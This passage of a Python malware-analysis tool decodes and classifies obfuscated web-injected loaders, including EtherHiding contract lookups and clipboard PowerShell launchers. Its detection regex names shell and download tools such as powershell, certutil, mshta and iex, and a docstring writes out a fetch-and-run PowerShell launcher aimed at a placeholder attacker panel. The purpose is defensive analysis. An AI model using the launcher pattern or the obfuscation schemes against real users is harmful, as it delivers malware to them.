    if '"gcm1"' in text or "'gcm1'" in text:            found.append("envelope_gcm1")
    if "API_Q2_KEY_HEX" in text:                        found.append("API_Q2_KEY_HEX")
    # Generation pick
    if "__BW_SCRIPT_INITIALIZED_V2__" in text or "site_repair_state" in text \
       or 'decryptApiEnvelope' in text or '"gcm1"' in text or "MODE_FILE_MAP" in text:
        return {"generation": "bw_v2", "markers_found": found,
                "confidence": min(1.0, 0.5 + 0.1 * len(found))}
    if "__BW_SCRIPT_INITIALIZED__" in text or "BW_CONFIG" in text or "bw-downloaded" in text:
        return {"generation": "bw_v1", "markers_found": found,
                "confidence": min(1.0, 0.4 + 0.1 * len(found))}
    return {"generation": "v3_unknown", "markers_found": found, "confidence": 0.0}

# Polygon RPC pool used by ErrTraffic v3 loaders + our resolver fallback.
DEFAULT_RPC_POOL = {
    "polygon": [
        "https://polygon.drpc.org",
        "https://polygon-bor-rpc.publicnode.com",
        "https://polygon.lava.build",
        "https://polygon-public.nodies.app",
        "https://polygon-pokt.nodies.app",
        "https://polygon.rpc.subquery.network/public",
    ],
    "bsc":         ["https://bsc-dataseed.bnbchain.org", "https://bsc.publicnode.com",
                    "https://bsc.drpc.org"],
    "bsc-testnet": ["https://bsc-testnet.publicnode.com", "https://bsc-testnet.bnbchain.org"],
    "ethereum":    ["https://ethereum.publicnode.com", "https://eth.drpc.org"],
}


def lookup_actor(addr: str | None) -> dict | None:
    return KNOWN_ACTORS.get(addr.lower()) if addr else None


def lookup_selector(sel: str | None) -> dict | None:
    return KNOWN_SELECTORS.get(sel.lower()) if sel else None


# ============================================================================
# Sandboxed arithmetic evaluator  (no eval / no exec / no JS)
# ============================================================================
_ALLOWED_BINOPS = (ast.Add, ast.Sub, ast.Mult, ast.Mod, ast.BitAnd, ast.BitOr,
                   ast.BitXor, ast.LShift, ast.RShift, ast.FloorDiv)
_ALLOWED_UNARY  = (ast.USub, ast.UAdd, ast.Invert)


class SafeEval:
    def __init__(self, names: dict): self.names = names
    def eval(self, expr: str): return self._ev(ast.parse(expr, mode="eval").body)
    def _ev(self, n):
        if isinstance(n, ast.BinOp) and isinstance(n.op, _ALLOWED_BINOPS):
            return self._apply(n.op, self._ev(n.left), self._ev(n.right))
        if isinstance(n, ast.UnaryOp) and isinstance(n.op, _ALLOWED_UNARY):
            v = self._ev(n.operand)
            return -v if isinstance(n.op, ast.USub) else (~v if isinstance(n.op, ast.Invert) else +v)
        if isinstance(n, ast.Constant) and isinstance(n.value, (int, str)):
            return n.value
        if isinstance(n, ast.Name):
            if n.id not in self.names: raise ValueError(f"unknown name {n.id!r}")
            return self.names[n.id]
        if isinstance(n, ast.Subscript):
            arr = self._ev(n.value); sl = n.slice
            if hasattr(ast, "Index") and isinstance(sl, ast.Index): sl = sl.value
            idx = self._ev(sl)
            if isinstance(arr, (list, tuple)):
                return arr[idx] if 0 <= idx < len(arr) else 0
            if isinstance(arr, str):
                return ord(arr[idx]) if 0 <= idx < len(arr) else 0
            raise ValueError("subscript on non-array/string")
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) \
                and n.func.attr == "charCodeAt" and len(n.args) == 1:
            target = self._ev(n.func.value); idx = self._ev(n.args[0])
            if isinstance(target, str):
                return ord(target[idx]) if 0 <= idx < len(target) else 0
            raise ValueError("charCodeAt on non-string")
        raise ValueError(f"disallowed node {type(n).__name__}")
    @staticmethod
    def _apply(op, a, b):
        if isinstance(op, ast.Add): return a + b
        if isinstance(op, ast.Sub): return a - b
        if isinstance(op, ast.Mult): return a * b
        if isinstance(op, ast.Mod): return a % b if b else 0
        if isinstance(op, ast.FloorDiv): return a // b if b else 0
        if isinstance(op, ast.BitAnd): return a & b
        if isinstance(op, ast.BitOr): return a | b
        if isinstance(op, ast.BitXor): return a ^ b
        if isinstance(op, ast.LShift): return a << b
        if isinstance(op, ast.RShift): return a >> b
        raise ValueError("bad op")


# ============================================================================
# Source-text scraping
# ============================================================================
_RE_INT_VAR   = re.compile(r'\b(?:var|let|const)?\s*(\w+)\s*=\s*(-?\d+)\s*[,;)\]}\n]')
_RE_ARR_VAR   = re.compile(r'\b(?:var|let|const)?\s*(\w+)\s*=\s*\[((?:\s*-?\d+\s*,)*\s*-?\d+\s*)\]')
_RE_STR_VAR   = re.compile(r'''\b(?:var|let|const)?\s*(\w+)\s*=\s*(['"`])([^'"`\n]{4,})\2''')
_RE_ATOB      = re.compile(r'\batob\(\s*(?:(["\'`])([A-Za-z0-9+/=\s]{16,})\1|(\w+))\s*\)')
_RE_ATOB_VAR  = re.compile(r'\b(\w+)\s*=\s*atob\(\s*(?:(["\'`])([A-Za-z0-9+/=\s]{16,})\2|(\w+))\s*\)')
_RE_CHARCODE  = re.compile(r'(\w+)\.charCodeAt\(\s*(\w+)\s*\)')
_RE_SCRIPT    = re.compile(r'<script\b(?![^>]*\bsrc=)[^>]*>(.*?)</script>', re.I | re.S)
_RE_SCRIPT_POS = re.compile(r'<script\b(?![^>]*\bsrc=)[^>]*>', re.I)    # for byte-offset lookup
_RE_SCRIPTSRC = re.compile(r'<script\b[^>]*\bsrc=["\']([^"\']+)["\']', re.I)
_RE_HEX_ESC   = re.compile(r'(?:\\x[0-9a-fA-F]{2}){8,}')
_RE_CC_ARRAY  = re.compile(r'String\.fromCharCode\.apply\(\s*null\s*,\s*\[((?:\s*\d+\s*,){4,}\s*\d+\s*)\]\s*\)')


def _b64(s: str) -> bytes:
    s = "".join(s.split()); s += "=" * (-len(s) % 4)
    return base64.b64decode(s, validate=False)


def _balanced(text: str, start_token: str, pos: int = 0):
    i = text.find(start_token, pos)
    if i < 0: return None, -1
    i += len(start_token); start, depth, n = i, 1, len(text)
    while i < n and depth:
        c = text[i]
        if c == "(": depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0: return text[start:i], i + 1
        i += 1
    return None, -1


def scrape_namespace(code: str, base: dict | None = None) -> dict:
    ns: dict = {}
    for m in _RE_ARR_VAR.finditer(code):
        try: ns[m.group(1)] = [int(x) for x in m.group(2).split(",")]
        except ValueError: pass
    for m in _RE_INT_VAR.finditer(code):
        if m.group(1) not in ns:
            try: ns[m.group(1)] = int(m.group(2))
            except ValueError: pass
    for m in _RE_STR_VAR.finditer(code):
        if m.group(1) not in ns: ns[m.group(1)] = m.group(3)
    if base:
        for k, v in base.items(): ns.setdefault(k, v)
    return ns


def _js_to_py_expr(expr: str, src_var: str) -> str:
    def repl(m): return "b" if m.group(1) == src_var else m.group(0)
    expr = _RE_CHARCODE.sub(repl, expr)
    return expr.replace("String.fromCharCode", "").strip()


# ============================================================================
# Obfuscation schemes
# ============================================================================
def _atob_blobs(code: str, ns: dict) -> list[tuple[str | None, bytes]]:
    out = []
    for m in _RE_ATOB_VAR.finditer(code):
        var, _q, lit, ref = m.group(1), m.group(2), m.group(3), m.group(4)
        s = lit if lit else (ns.get(ref) if isinstance(ns.get(ref), str) else None)
        if not s: continue
        try: raw = _b64(s)
        except Exception: continue
        if any(raw == r for _, r in out): continue
        out.append((var, raw))
    for m in _RE_ATOB.finditer(code):
        _q, lit, ref = m.group(1), m.group(2), m.group(3)
        s = lit if lit else (ns.get(ref) if isinstance(ns.get(ref), str) else None)
        if not s: continue
        try: raw = _b64(s)
        except Exception: continue
        if any(raw == r for _, r in out): continue
        out.append((None, raw))
    out.sort(key=lambda kv: len(kv[1]), reverse=True)
    return out


def scheme_atob_byte_transform(code: str, ns: dict):
    blobs = _atob_blobs(code, ns)
    if not blobs: return None, None
    expr = None
    inner, _end = _balanced(code, "String.fromCharCode(")
    if inner and "charCodeAt" in inner: expr = inner
    if expr is None:
        m = re.search(r'\[\s*\w+\s*\]\s*=\s*([^;\n}]*charCodeAt[^;\n}]*)', code)
        if m: expr = m.group(1).strip()
    if expr is None:
        m = re.search(r'(\w+\.charCodeAt\([^)]*\))\s*([\^&|+\-*%][^;)\]\n]+)', code)
        if m: expr = m.group(1) + m.group(2)
    if expr is None: return None, None
    src_var, payload = None, None
    for var, raw in blobs:
        if var and var in expr: src_var, payload = var, raw; break
    if payload is None: src_var, payload = blobs[0]
    if src_var is None:
        src_var = "__blob"
        expr = re.sub(r'\w+\.charCodeAt', f'{src_var}.charCodeAt', expr, count=1)
    py_expr = _js_to_py_expr(expr, src_var)
    ev = SafeEval({**ns, "b": 0, "i": 0})
    try: ev.eval(py_expr)
    except Exception as e: return None, f"transform parse failed: {e}"
    is_u8 = "Uint8Array" in code or "TextDecoder" in code
    out_b, out_c = bytearray(), []
    try:
        for i, byte in enumerate(payload):
            ev.names["b"] = byte; ev.names["i"] = i
            v = ev.eval(py_expr)
            if is_u8: out_b.append(v & 0xFF)
            else: out_c.append(chr(v & 0xFFFF))
    except Exception as e: return None, f"transform eval failed at i={i}: {e}"
    text = out_b.decode("utf-8", "replace") if is_u8 else "".join(out_c)
    return text, f"atob({len(payload)}B) -> [{py_expr}] -> {'utf8' if is_u8 else 'fromCharCode'}"


def scheme_atob_utf8_roundtrip(code: str, ns: dict):
    if not (re.search(r'\bdecodeURIComponent\s*\(\s*escape\s*\(\s*atob\b', code)
            or re.search(r'\bunescape\s*\(\s*escape\s*\(\s*atob\b', code)
            or re.search(r'\bdecodeURI\s*\(\s*atob\b', code)):
        return None, None
    blobs = _atob_blobs(code, ns)
    if not blobs: return None, None
    _, raw = blobs[0]
    try: text = raw.decode("utf-8")
    except Exception: text = raw.decode("latin-1")
    return text, f"atob({len(raw)}B) -> utf8-roundtrip"


def scheme_atob_reversed(code: str, ns: dict):
    if not re.search(r'atob\([^)]+\)\s*\.\s*split\s*\([^)]*\)\s*\.\s*reverse\s*\(\)\s*\.\s*join', code):
        return None, None
    blobs = _atob_blobs(code, ns)
    if not blobs: return None, None
    _, raw = blobs[0]
    return raw.decode("latin-1")[::-1], f"atob({len(raw)}B) -> reversed"


def scheme_charcode_array(code: str, ns: dict):
    m = _RE_CC_ARRAY.search(code)
    if not m: return None, None
    try: nums = [int(x) for x in m.group(1).split(",")]
    except ValueError: return None, None
    return "".join(chr(n & 0xFFFF) for n in nums), f"charCodeArray({len(nums)} ints)"


def scheme_hex_escape_blob(code: str, ns: dict):
    m = _RE_HEX_ESC.search(code)
    if not m: return None, None
    blob = m.group(0)
    bytes_ = bytes(int(blob[i+2:i+4], 16) for i in range(0, len(blob), 4))
    return bytes_.decode("utf-8", "replace"), f"hexEscape({len(bytes_)}B)"


# Pattern for the BW v2 / ErrTraffic v3 (May 2026 generation) loader layout:
#
#   (function(){
#     var KEY = <int>;
#     var BLOB = '<base64>';
#     function DECODER(s, k) {
#       s = atob(s);
#       /* arr[i] = s.charCodeAt(i) ^ k; */
#       /* utf-8 round-trip via TextDecoder or escape() fallback */
#     }
#     var X = DECODER(BLOB, KEY);
#     (new Function(X))();
#   })();
#
# The decoder function is one layer of indirection deeper than the generic
# atob_byte_transform scheme handles (which looks for charCodeAt at the top
# scope). This scheme matches the IIFE explicitly: identify the decoder
# function by its body (atob + charCodeAt + XOR), then find the call site
# DECODER(BLOB, KEY) to bind the arguments, then apply.
# The regex captures any 2-arg function whose body contains the canonical
# atob+XOR pattern, regardless of which parameter is the data and which is the
# key. We disambiguate at the call site by argument TYPE (str → blob, int → key).
_RE_BW_V2_DECODER_FN = re.compile(
    r'function\s+(\w+)\s*\(\s*(\w+)\s*,\s*(\w+)\s*\)\s*\{[^}]*?'
    r'\batob\s*\([^)]+\)[^}]*?'
    r'\.charCodeAt\s*\([^)]+\)\s*\^\s*(?:\2|\3)'
    r'[^}]*?\}',
    re.S
)


def scheme_bw_v2_iife_xor(code: str, ns: dict):
    """Match the ErrTraffic v3 (BW v2 generation) IIFE-wrapped XOR loader.
    The decoder is defined as a nested function and called with (BLOB, KEY)
    explicit args. Mirrors the kit's exact JS: atob → byte XOR → utf-8 with
    `decodeURIComponent(escape(...))` fallback.

    Returns (decoded_text, info_str) on success, or (None, reason_str)."""
    m = _RE_BW_V2_DECODER_FN.search(code)
    if not m: return None, None
    fn_name, src_param, key_param = m.group(1), m.group(2), m.group(3)
    # Find a USABLE call site: FN_NAME(BLOB, KEY) OR FN_NAME(KEY, BLOB). Match
    # ALL occurrences and skip the function signature itself (whose args are
    # the parameter names s,k which aren't in the page namespace). Pick the
    # first call whose two args resolve to a (str, int) pair in either order.
    call_re = re.compile(rf'\b{re.escape(fn_name)}\s*\(\s*(\w+)\s*,\s*(\w+)\s*\)')
    blob = key = None
    chosen_args = (None, None)
    for cm in call_re.finditer(code):
        a1, a2 = cm.group(1), cm.group(2)
        # Skip the function-definition signature line (args are parameter names)
        if {a1, a2} == {src_param, key_param}: continue
        v1, v2 = ns.get(a1), ns.get(a2)
        if isinstance(v1, str) and isinstance(v2, int):
            blob, key, chosen_args = v1, v2, (a1, a2); break
        if isinstance(v2, str) and isinstance(v1, int):
            blob, key, chosen_args = v2, v1, (a1, a2); break
    if blob is None or key is None:
        return None, (f"BW-v2 decoder fn `{fn_name}` defined but no usable "
                      f"(blob,key) call site found in code")
    a1, a2 = chosen_args
    # Sanity-check XOR key is a single byte
    if not (0 <= key <= 0xFF):
        return None, f"BW-v2 XOR key out of byte range: {key}"
    # Decode: atob(blob) -> bytes ^ key -> utf-8 (with the kit's escape fallback)
    try:
        raw = _b64(blob)
    except Exception as e:
        return None, f"BW-v2 base64 decode failed: {e}"
    out = bytes(b ^ key for b in raw)
    try:
        text = out.decode("utf-8")
    except UnicodeDecodeError:
        # Mirror the kit's `decodeURIComponent(escape(tmp))` fallback by reading
        # the bytes as latin-1 first then UTF-8 — for our purposes treating the
        # bytes as latin-1 captures whatever the loader meant.
        text = out.decode("latin-1")
    return text, (f"BW-v2 IIFE XOR: fn={fn_name}, blob={a1 if blob is v1 else a2} "
                  f"({len(raw)}B), key=0x{key:02x} ({key})")


SCHEMES = [
    # Order matters — most specific first. The BW v2 IIFE matcher catches
    # explicit `decoder(BLOB, KEY)` calls which the generic top-scope
    # atob_byte_transform misses (it can't reach through the function
    # indirection).
    ("bw_v2_iife_xor",       scheme_bw_v2_iife_xor),
    ("atob_byte_transform",  scheme_atob_byte_transform),
    ("atob_utf8_roundtrip",  scheme_atob_utf8_roundtrip),
    ("atob_reversed",        scheme_atob_reversed),
    ("charcode_array",       scheme_charcode_array),
    ("hex_escape_blob",      scheme_hex_escape_blob),
]


def is_obfuscated(code: str) -> bool:
    if "atob(" in code and ("charCodeAt" in code or "fromCharCode" in code): return True
    if "atob(" in code and ("decodeURIComponent" in code or "unescape(" in code): return True
    if _RE_CC_ARRAY.search(code): return True
    if _RE_HEX_ESC.search(code): return True
    return False


def decode_layer(code: str, ns: dict):
    last_reason = "no recognized scheme"
    for name, fn in SCHEMES:
        try: text, info = fn(code, ns)
        except Exception as e: last_reason = f"{name} raised: {e}"; continue
        if text is not None: return text, name, info
        if info: last_reason = f"{name}: {info}"
    return None, None, last_reason


def decode_chain(code: str, page_ns: dict, max_depth: int = 8):
    methods, cur, depth = [], code, 0
    while depth < max_depth and is_obfuscated(cur):
        local_ns = scrape_namespace(cur, page_ns)
        text, name, info = decode_layer(cur, local_ns)
        if text is None:
            methods.append({"scheme": "[stop]", "info": info}); break
        methods.append({"scheme": name, "info": info})
        cur = text; depth += 1
    return cur, methods


# ============================================================================
# Classifiers
# ============================================================================
_ETH_RPC_HOST_RE  = re.compile(
    r'https?://(?:[a-z0-9-]+\.)*'
    r'(?:publicnode\.com|drpc\.org|lava\.build|nodies\.app|pokt\.network|alchemy\.com|'
    r'infura\.io|quicknode\.com|chainstack\.com|getblock\.io|subquery\.network|'
    r'ankr\.com|blastapi\.io|llamarpc\.com|blockpi\.network|polygonscan\.com|'
    r'bnbchain\.org|binance\.org|onfinality\.io)/?[^\s\'"<>)\]}]*', re.I)
_ETH_ADDR_RE       = re.compile(r"['\"](0x[a-fA-F0-9]{40})['\"]")
_ETH_SELECTOR_RE   = re.compile(r"data\s*:\s*['\"]0x([a-fA-F0-9]{8,16})['\"]"
                                r"|data\s*:\s*['\"]0x['\"]\s*\+\s*(\w+)"
                                # BW v2 generation: 'FUNCTION_SELECTOR:"b68d1809"' inside
                                # a CONTRACT_CONFIG object — the kit author's modern layout.
                                r"|(?:FUNCTION_SELECTOR|methodSelector|FN_SELECTOR|selectorHex)"
                                r"\s*[:=]\s*['\"]0?x?([a-fA-F0-9]{8})['\"]")
_ETH_SEL_VAR_RE    = re.compile(r"""\b(\w+)\s*=\s*['"]([a-fA-F0-9]{6,16})['"]""")
_ETH_CALL_RE       = re.compile(r"method\s*:\s*['\"]eth_call['\"]", re.I)
_CHAIN_HINTS = [
    ("polygon",  r'polygon|matic|pokt'),
    ("bsc",      r'\bbsc\b|binance|bnb-chain|bnbchain|bsc-?mainnet'),
    ("bsc-testnet", r'bsc-?testnet|data-seed-prebsc'),
    ("ethereum", r'\beth(?:ereum)?(?!_)|mainnet\.infura|eth-mainnet'),
    ("base",     r'base-rpc|basemainnet|base\.org'),
    ("arbitrum", r'arbitrum'),
    ("optimism", r'optimism\.io|op-mainnet'),
]
_CMD_RE = re.compile(
    r'(powershell[^\n"\'`]{0,400}|pwsh[^\n"\'`]{0,400}|mshta[^\n"\'`]{0,300}|'
    r'msiexec[^\n"\'`]{0,300}|cmd(?:\.exe)?\s*/c[^\n"\'`]{0,300}|certutil[^\n"\'`]{0,300}|'
    r'bitsadmin[^\n"\'`]{0,300}|curl[^\n"\'`]{0,300}|wscript[^\n"\'`]{0,300}|'
    r'regsvr32[^\n"\'`]{0,300}|rundll32[^\n"\'`]{0,300}|Invoke-Expression[^\n]{0,200}|'
    r'iex\b[^\n]{0,200}|irm\b[^\n]{0,200}|Start-Process[^\n]{0,200})', re.I)
_FB64_RE   = re.compile(r'FromBase64String\(\s*[\'"]([A-Za-z0-9+/=]{12,})[\'"]', re.I)
_AES_RE    = re.compile(r'RijndaelManaged|AesManaged|CreateDecryptor|TransformFinalBlock|Security\.Crypto', re.I)
_CFID_RE   = re.compile(r'(?:Cloudflare\s*ID|Verification\s*code|Code\s*Verification|Ray\s*ID)\s*[:=]\s*([0-9a-fA-F]{6,})', re.I)
_CLIP_RE   = re.compile(r'navigator\.clipboard\.writeText|document\.execCommand\(\s*[\'"]copy|'
                        r'\.value\s*=\s*[\'"`][^\'"`]{20,}', re.I)
_TDS_RE    = re.compile(r'(?:webanalytics-cdn|fp-collector|fingerprintjs|adsbeacon|tracksdk)\.[a-z]{2,15}', re.I)
_OS_GATE_RE = re.compile(r'/Windows/\.test|/Mac\s*OS/\.test|/iPhone\|iPad/\.test|navigator\.userAgent', re.I)
_DBG_GATE_RE = re.compile(r'\bdebugger\s*;|performance\.now\(\)\s*[-+]\s*\w+\s*>\s*\d+', re.I)
_COOKIE_GATE_RE = re.compile(r"document\.cookie\.indexOf\(\s*['\"]([\w_-]+)=", re.I)
_URL_RE  = re.compile(r'https?://[^\s\'"<>)\]}`]+', re.I)
_IP_RE   = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b')


def _defang(u: Any) -> Any:
    if not isinstance(u, str): return u
    if "://" in u:
        sch, rest = u.split("://", 1)
        return f"{sch.replace('http','hxxp')}://{rest.replace('.', '[.]', 1)}"
    return u.replace(".", "[.]")


def _refang(s: str) -> str:
    """Reverse: '[.]'/'(.)'/'hxxp' -> '.'/'http'."""
    s = s.replace("[.]", ".").replace("(.)", ".").replace("[dot]", ".").replace("{.}", ".")
    s = re.sub(r'\bhxxp(s?)://', r'http\1://', s, flags=re.I)
    return s


def classify_etherhiding(text: str) -> dict | None:
    rpcs = sorted({m.group(0).rstrip('/?,') for m in _ETH_RPC_HOST_RE.finditer(text)})
    addrs = sorted({m.group(1) for m in _ETH_ADDR_RE.finditer(text)})
    has_eth_call = bool(_ETH_CALL_RE.search(text))
    score = (1 if has_eth_call else 0) + (1 if addrs else 0) + (1 if len(rpcs) >= 2 else 0)
    if score < 2: return None
    sel = None
    m = _ETH_SELECTOR_RE.search(text)
    if m:
        # groups: (1) literal 0x... in data, (2) var-name in data:0x+var,
        # (3) FUNCTION_SELECTOR/methodSelector literal — BW v2 layout
        raw = m.group(1) or m.group(3) or m.group(2)
        if raw and len(raw) in (8, 16) and all(c in "0123456789abcdefABCDEF" for c in raw):
            sel = raw.lower()
        elif raw:
            for vm in _ETH_SEL_VAR_RE.finditer(text):
                if vm.group(1) == raw and len(vm.group(2)) in (8, 16):
                    sel = vm.group(2).lower(); break
    chain = "unknown"
    for label, pat in _CHAIN_HINTS:
        if re.search(pat, " ".join(rpcs).lower()): chain = label; break
    selector_full = f"0x{sel}" if sel else None
    attribution = None
    for a in addrs:
        att = lookup_actor(a)
        if att: attribution = {"contract_matched": a, **att}; break
    return {
        "scheme":              "etherhiding",
        "chain":               chain,
        "contract_addresses":  addrs,
        "method_selector":     selector_full,
        "selector_info":       lookup_selector(selector_full),
        "rpc_pool":            rpcs,
        "rpc_pool_defanged":   [_defang(u) for u in rpcs],
        "wall_reason":         ("next-stage URL/JS is stored in contract storage and returned by "
                                "eth_call; cannot be recovered statically without an RPC fetch"),
        "actor_attribution":   attribution,
    }


def classify_clipboard_payload(text: str) -> dict | None:
    if not _CLIP_RE.search(text): return None
    arg = None
    m = re.search(r'navigator\.clipboard\.writeText\(\s*(["\'`])(.+?)\1', text, re.S)
    if m: arg = m.group(2)
    if arg is None:
        m = re.search(r'navigator\.clipboard\.writeText\(\s*(\w+)\s*\)', text)
        if m:
            mm = re.search(rf'\b{re.escape(m.group(1))}\s*=\s*(["\'`])(.+?)\1', text, re.S)
            if mm: arg = mm.group(2)
    return {
        "scheme":                 "clipboard_payload",
        "sink":                   ("navigator.clipboard.writeText" if "writeText" in text
                                   else "execCommand('copy')"),
        "clipboard_arg_excerpt":  (arg[:400] + ("…" if arg and len(arg) > 400 else "")) if arg else None,
        "clipboard_arg_length":   len(arg) if arg else None,
    }


def classify_aes_kit(text: str) -> dict | None:
    if not _AES_RE.search(text): return None
    blobs = _FB64_RE.findall(text)
    cfids = [m.group(1) for m in _CFID_RE.finditer(text)]
    return {
        "scheme":           "aes_kit",
        "fromBase64_blobs": [{"len": len(b), "head": b[:48]} for b in blobs[:6]],
        "labeled_ids":      cfids[:6],
        "note":             ("RijndaelManaged/AES kit (key+IV+ciphertext as base64, "
                             "scriptblock-invoked plaintext) — N1 AES-wave family"),
    }


def classify_powershell_command(text: str) -> dict | None:
    cmds = sorted({c.strip()[:400] for c in _CMD_RE.findall(text)})
    if not cmds: return None
    return {"scheme": "powershell_command", "commands": cmds[:8]}


def classify_bw_v2_launcher(text: str) -> dict | None:
    """Recognize the ErrTraffic v3 (BW v2 generation) plaintext clipboard PS
    launcher. Distinct from classify_aes_kit (which catches the AES-wrapped v3
    original) — BW v2 dropped the clipboard-AES layer and ships a plain PS
    that does:
        Invoke-WebRequest -Uri 'https://<panel>/api/index.php?a=dl&uj=HEX&rlm=B64' -OutFile $X
        Start-Process powershell -ArgumentList ... -File $X

    Recognizing this shape lets us identify a v3-BWv2 hit directly from a
    captured clipboard command, without needing any AES recovery step."""
    # Strict marker: a /api/index.php?a=dl URL using the BW v2 `uj=` token alias.
    m = re.search(
        r'(https?://[^\s\'"`]+/api/index\.php\?[^\s\'"`]*?\ba=dl\b[^\s\'"`]*\buj=([0-9a-fA-F]{32,128})\b'
        r'(?:[^\s\'"`]*\brlm=([A-Za-z0-9_\-]{1,32}))?[^\s\'"`]*)',
        text)
    if not m: return None
    dl_url, token, rlm = m.group(1), m.group(2), m.group(3)
    # Companion-signal: does this launcher actually invoke + run the .ps1 it fetches?
    has_iwr        = bool(re.search(r'\bInvoke-WebRequest\b|\biwr\b', text, re.I))
    has_start_proc = bool(re.search(r'\bStart-Process\b', text, re.I))
    has_file_arg   = bool(re.search(r'-File\s*\$\w+|-File\s+["\'`][^"\'`]+["\'`]', text))
    has_iex        = bool(re.search(r'\bInvoke-Expression\b|\biex\b', text, re.I))
    confidence = 0.95 if (has_iwr and (has_start_proc or has_iex or has_file_arg)) else 0.85
    return {
        "scheme":               "bw_v2_launcher",
        "dl_url":               dl_url,
        "dl_url_defanged":      _defang(dl_url),
        "token":                token,
        "token_alias":          "uj",
        "rlm":                  rlm,
        "src_alias":            "rlm",
        "has_invoke_webrequest": has_iwr,
        "has_start_process":    has_start_proc,
        "has_file_arg":         has_file_arg,
        "has_invoke_expression": has_iex,
        "confidence":           confidence,
        "kit":                  "ErrTraffic v3 (BW v2 generation)",
        "note":                 ("Plaintext (non-AES-wrapped) clipboard PowerShell launcher per the BW v2 "
                                 "victim chain. Replaces the AES-CBC wrap used in the v3 original "
                                 "generation. Re-run with --comprehensive --payload to attempt the "
                                 "init→dl chain against the panel using the captured token."),
    }


def classify_tds_beacon(text: str) -> dict | None:
    hits = sorted({h for h in _TDS_RE.findall(text)})
    if not hits: return None
    return {"scheme": "tds_beacon", "hosts": hits, "hosts_defanged": [_defang(h) for h in hits]}


def classify_antianalysis_gate(text: str) -> dict | None:
    flags = {"scheme": "antianalysis_gate",
             "debugger_timing_gate": False, "os_device_gate": False,
             "os_device_excl": [], "cookie_dedup_names": []}
    hit = False
    if _DBG_GATE_RE.search(text): flags["debugger_timing_gate"] = True; hit = True
    if _OS_GATE_RE.search(text):
        excl = re.findall(
            r'\[\s*("(?:iOS|Android|mobile|tablet)")\s*(?:,\s*("(?:iOS|Android|mobile|tablet)")\s*)*\]',
            text)
        flags["os_device_gate"] = True
        flags["os_device_excl"] = sorted({s.strip('"') for tup in excl for s in tup if s})
        hit = True
    cookies = sorted(set(_COOKIE_GATE_RE.findall(text)))
    if cookies: flags["cookie_dedup_names"] = cookies; hit = True
    return flags if hit else None


CLASSIFIERS = [classify_etherhiding, classify_clipboard_payload, classify_aes_kit,
               classify_bw_v2_launcher,
               classify_powershell_command, classify_tds_beacon, classify_antianalysis_gate]


def classify(text: str) -> list[dict]:
    return [c for c in (fn(text) for fn in CLASSIFIERS) if c]


def extract_loose_iocs(text: str) -> dict:
    return {
        "urls":               sorted({_defang(u) for u in _URL_RE.findall(text)})[:30],
        "ips":                sorted({_defang(ip) for ip in _IP_RE.findall(text)})[:30],
        "labeled_ids":        sorted({m.group(1) for m in _CFID_RE.finditer(text)})[:8],
        "contract_addresses": sorted({m.group(1) for m in _ETH_ADDR_RE.finditer(text)}),
    }


# ============================================================================
# Passive HTTP fetch (--url, target list)
# ============================================================================
_BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36")


def fetch_url_passively(url: str, timeout: int = DEFAULT_FETCH_TIMEOUT,
                        max_bytes: int = DEFAULT_MAX_BYTES, verify_tls: bool = True,
                        extra_headers: dict | None = None
                        ) -> tuple[str, dict]:
    """Passive HTTP GET. Returns (body_text, meta_dict). meta now ALSO includes
    a `headers` dict (all response headers, case-insensitive) so downstream
    detectors (Cloudflare, WordPress) can read CF-RAY, Server, Link, etc."""
    if not url.startswith(("http://", "https://")):
        raise ValueError(f"URL must start with http(s)://  — got {url!r}")
    base_headers = {
        "User-Agent": _BROWSER_UA,
        "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
    }
    if extra_headers: base_headers.update(extra_headers)
    req = urllib.request.Request(url, headers=base_headers)
    ctx = ssl.create_default_context() if verify_tls else ssl._create_unverified_context()
    started = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        body = r.read(max_bytes)
        # Normalize headers into a plain dict (lower-keyed) — urllib returns a
        # case-insensitive HTTPMessage; we keep it readable for JSON serialization
        hdr = {k: v for k, v in r.headers.items()}
        meta = {
            "fetched_at":     started,
            "status":         r.status,
            "final_url":      r.url,
            "content_type":   r.headers.get("Content-Type"),
            "bytes_received": len(body),
            "truncated":      len(body) == max_bytes,
            "headers":        hdr,
        }
    enc = "utf-8"
    ct = meta["content_type"] or ""
    m = re.search(r'charset\s*=\s*([\w-]+)', ct, re.I)
    if m: enc = m.group(1)
    try: return body.decode(enc, errors="replace"), meta
    except LookupError: return body.decode("utf-8", errors="replace"), meta


# ============================================================================
# Passive on-chain resolver  (--resolve)
# ============================================================================
def rpc_call(rpc_url: str, method: str, params: list, timeout: int = DEFAULT_RPC_TIMEOUT) -> Any:
    req = urllib.request.Request(
        rpc_url, data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": method,
                                   "params": params}).encode(),
        headers={"Content-Type": "application/json", "User-Agent": _BROWSER_UA},
        method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        resp = json.loads(r.read())
    if "error" in resp:
        raise RuntimeError(f"RPC error: {resp['error']}")
    return resp.get("result")


def eth_call(rpc_url: str, contract: str, selector_hex: str,
             timeout: int = DEFAULT_RPC_TIMEOUT) -> str:
    if not selector_hex.startswith("0x"): selector_hex = "0x" + selector_hex
    if not contract.startswith("0x"):     contract = "0x" + contract
    return rpc_call(rpc_url, "eth_call",
                    [{"to": contract, "data": selector_hex}, "latest"], timeout=timeout) or ""


def decode_abi_string(hex_data: str, lax_drop_nulls: bool = True) -> str | None:
    """Decode an ABI-encoded `string` return. With lax_drop_nulls=True, behaves
    like ErrTraffic's _f395efb0() — reads length at chars 64-128, takes bytes
    from 128+, drops zeros, trims."""
    if not hex_data: return None
    if hex_data.startswith("0x"): hex_data = hex_data[2:]
    if len(hex_data) < 128: return None
    try: length = int(hex_data[64:128], 16)
    except ValueError: return None
    if length == 0 or length > 8192: return None
    data_hex = hex_data[128:128 + length * 2]
    if len(data_hex) < length * 2: return None
    raw = bytes.fromhex(data_hex)
    if lax_drop_nulls:
